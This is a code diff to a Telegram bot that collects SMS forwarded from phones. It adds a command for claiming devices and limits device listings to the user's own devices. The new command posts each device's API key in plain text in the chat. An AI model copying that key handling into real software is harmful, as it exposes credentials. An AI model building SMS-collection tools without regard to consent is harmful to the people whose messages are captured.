@@ -7,7 +7,7 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 
 from app.config import get_settings
 from app.database import Device, SMSMessage, SessionLocal
-from app.services import device_status, list_devices_with_counts, register_device
+from app.services import claim_device, device_status, list_devices_with_counts, register_device
 
 logger = logging.getLogger(__name__)
 settings = get_settings()
@@ -72,6 +72,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     await update.message.reply_text(
         "👋 *SMS Monitor Bot*\n\n"
         "Commands:\n"
+        "/a <deviceid> - Apni device add/claim karo\n"
         "/devices - Apni saari devices dekho\n"
         "/device <name> - Ek device ke SMS dekho\n"
         "/adddevice <name> - Nayi device add karo\n"
@@ -92,7 +93,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "Apna database `.env` mein `DATABASE_URL` se connect karo.\n"
         "Device SMS bhejti hai to automatically bot mein aa jati hai.\n\n"
         "*Device commands:*\n"
-        "/devices - Saari devices list\n"
+        "/a myphone - Apni device add/claim karo\n"
+        "/devices - Meri devices list\n"
         "/device redmi - Us device ke recent SMS\n"
         "/adddevice samsung - Manual device add\n\n"
         "*SMS commands:*\n"
@@ -103,26 +105,72 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     )
 
 
+async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "Usage: `/a <deviceid>`\n\n"
+            "Example:\n"
+            "`/a redmi-note-12`\n"
+            "`/a 3`",
+            parse_mode="Markdown",
+        )
+        return
+
+    deviceid = context.args[0]
+    db: Session = SessionLocal()
+    try:
+        device, created = claim_device(db, deviceid, user.id)
+        sms_count = (
+            db.query(SMSMessage)
+            .filter(SMSMessage.device_id == device.id)
+            .count()
+        )
+    except PermissionError:
+        await update.message.reply_text("❌ Ye device kisi aur user ki hai.")
+        return
+    finally:
+        db.close()
+
+    status = device_status(device)
+    status_icon = {"online": "🟢", "idle": "🟡", "offline": "🔴"}.get(status, "⚪")
+    action = "added" if created else "linked"
+
+    await update.message.reply_text(
+        f"✅ Device {action}: `{device.name}`\n\n"
+        f"🆔 ID: `{device.id}`\n"
+        f"{status_icon} Status: *{status}*\n"
+        f"📨 SMS count: *{sms_count}*\n"
+        f"🔑 API key: `{device.api_key}`\n\n"
+        f"Phone webhook mein ye key use karo.",
+        parse_mode="Markdown",
+    )
+
+
 async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized(update.effective_user.id if update.effective_user else None):
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
         return
 
     db: Session = SessionLocal()
     try:
-        items = list_devices_with_counts(db)
+        items = list_devices_with_counts(db, owner_telegram_id=user.id)
     finally:
         db.close()
 
     if not items:
         await update.message.reply_text(
-            "📭 Abhi koi device nahi hai.\n\n"
-            "Add karo: `/adddevice my-phone`\n"
-            "Ya SMS forward karo — device auto add ho jayegi.",
+            "📭 Abhi tumhari koi device nahi hai.\n\n"
+            "Add karo: `/a my-phone`\n"
+            "Ya pehle SMS forward karo, phir `/a deviceid` se claim karo.",
             parse_mode="Markdown",
         )
         return
 
-    lines = ["📱 *Tumhari Devices*\n"]
+    lines = ["📱 *Meri Devices*\n"]
     for item in items:
         lines.append(format_device_line(item["device"], item["sms_count"]))
 
@@ -292,6 +340,7 @@ def build_telegram_app() -> Application | None:
     app = Application.builder().token(settings.telegram_bot_token).build()
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("a", a_command))
     app.add_handler(CommandHandler("devices", devices_command))
     app.add_handler(CommandHandler("device", device_command))
     app.add_handler(CommandHandler("adddevice", adddevice_command))
